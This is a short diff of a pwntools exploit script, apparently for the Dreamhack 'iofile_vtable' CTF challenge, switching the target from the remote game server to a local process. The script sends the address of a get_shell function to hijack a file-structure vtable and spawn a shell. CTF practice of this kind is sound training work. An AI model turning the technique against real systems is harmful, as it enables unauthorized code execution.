@@ -7,8 +7,8 @@ addr_shell = elf.symbols['get_shell']
 log.info('addr_name: ' + hex(addr_name))
 log.info('addr_shell: ' + hex(addr_shell))
 
-#p = process('iofile_vtable')
-p = remote('host1.dreamhack.games', 12112)
+p = process('iofile_vtable')
+#p = remote('host1.dreamhack.games', 12112)
 p.sendlineafter(': ', p64(addr_shell))
 
 p.sendlineafter('> ', '4')
